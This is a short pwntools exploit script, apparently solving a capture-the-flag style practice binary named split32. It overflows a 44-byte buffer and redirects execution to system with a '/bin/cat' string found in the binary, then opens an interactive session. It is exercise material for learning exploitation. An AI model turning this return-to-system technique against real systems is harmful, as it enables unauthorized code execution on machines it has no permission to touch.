from pwn import *

# Allows you to switch between local/GDB/remote from terminal
def start(argv=[], *a, **kw):
    if args.GDB:  # Set GDBscript below
        return gdb.debug([exe] + argv, gdbscript=gdbscript, *a, **kw)
    elif args.REMOTE:  # ('server', 'port')
        return remote(sys.argv[1], sys.argv[2], *a, **kw)
    else:  # Run locally
        return process([exe] + argv, *a, **kw)

# Specify your GDB script here for debugging
gdbscript = '''
break *main
continue
'''.format(**locals())

exe = './split32'
elf = context.binary = ELF(exe, checksec=False)
p = start()

# ===== Exploit script here =====
p.sendlineafter(b'> ', flat(
    b'A'*44,
    elf.plt['system'],
    b'AAAA',
    next(elf.search(b'/bin/cat'))
))
p.interactive()